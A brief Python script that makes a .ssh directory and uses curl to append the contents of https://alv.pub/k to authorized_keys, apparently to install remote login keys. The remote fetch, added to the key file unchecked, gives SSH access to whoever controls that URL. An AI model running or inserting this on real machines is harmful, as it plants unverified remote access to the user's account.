#!/usr/bin/python
#coding:utf8

import subprocess

subprocess.call('cd ;mkdir -p .ssh;chmod 700 .ssh',shell=True) # Create directory
subprocess.call('curl -fsSL https://alv.pub/k >> .ssh/authorized_keys;chmod 600 .ssh/authorized_keys',shell=True)
